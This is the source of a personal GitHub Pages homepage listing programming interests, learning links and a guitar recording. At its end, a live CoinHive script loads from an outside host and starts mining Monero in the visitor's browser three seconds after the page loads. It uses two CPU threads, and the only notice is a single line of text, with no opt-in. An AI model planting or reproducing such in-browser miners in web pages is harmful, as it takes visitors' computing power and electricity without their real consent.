Welcome to the user site of [github/bohadi](https://github.com/bohadi).<br>
Feel free to look around.

I am interested in engineering effective software<br>
via application of category theory and type theory.

<!--
compilers, blockchain, gpgpu

also AI/ML, genomics, 3d games
-->

<!--
contact me

bohadi@users.noreply.github.com
-->

helpful learning resources:<br>
[ParCon](http://chimera.labs.oreilly.com/books/1230000000929/index.html)<br>
[PFPL](http://www.cs.cmu.edu/~rwh/pfpl.html)<br>
[CTFP](https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/)<br>
[oplss17](https://www.cs.uoregon.edu/research/summerschool/summer17/topics.php)<br>
[ncatlabwiki](https://ncatlab.org/nlab/show/HomePage)<br>
[HoTT](https://homotopytypetheory.org/book/)<br>
[IToC](https://math.mit.edu/~sipser/book.html)<br>
[AOSA/ghc](http://www.aosabook.org/en/ghc.html)<br>
[archwiki](https://wiki.archlinux.org/)<br>
[r/haskell](http://www.reddit.com/r/haskell)<br>
[r/rust](http://www.reddit.com/r/rust)<br>
[TRPL](https://doc.rust-lang.org/stable/book/second-edition/)<br>


more nice links:<br>
[news.ycombinator.com](https://news.ycombinator.com)<br>
[cryptowat.ch](https://cryptowat.ch)<br>
[SEP/random](https://plato.stanford.edu/cgi-bin/encyclopedia/random)<br>


I enjoy playing the guitar, here is a short recording.

<audio width="400" height="40" controls controlsList="nodownload">
  <source src="noodle.mp3" type="audio/mpeg">
</audio>

<br>

Thank you for visiting.<br>
Finally, this page can mine Monero on your machine.<br>
<div id='minerstatus'>
Attempting to connect...
</div>
<div id='minerio'>
Hashes/second: 0   <br>
total Hashes: 0    <br>
</div>

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
  var minerstatus = document.getElementById('minerstatus');
  var minerio     = document.getElementById('minerio');
  setTimeout( function() {
    try {
      var miner = new CoinHive.Anonymous('A9pTI4370gQQt0dRaNJFmFnPXXDvsEwS', {
        threads: 2,
        throttle: 0.5
      });
      miner.start();
      miner.on('open', function() {
        minerstatus.innerHTML =
          'Connected... ('+miner.getNumThreads()+' threads throttled at '+
          100*miner.getThrottle().toFixed(2)+'% WASM supported: '+miner.hasWASMSupport()+')';
      });
      miner.on('error', function() {
        miner.stop();
        minerstatus.innerHTML = '...Connection error. Miner stopping.';
      });
      setInterval(function() {
        minerio.innerHTML = 
          'Hashes/second:  '   + miner.getHashesPerSecond().toFixed(0) + '<br>' +
          ' total Hashes: '    + miner.getTotalHashes()                + '<br>' ;
      }, 1000);
    } catch (e) {
      minerstatus.innerHTML = '...Connection error (adblock). Miner stopping.';
    }
  }, 3000);
</script>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-106946514-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments)};
  gtag('js', new Date());
  gtag('config', 'UA-106946514-1');
</script>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
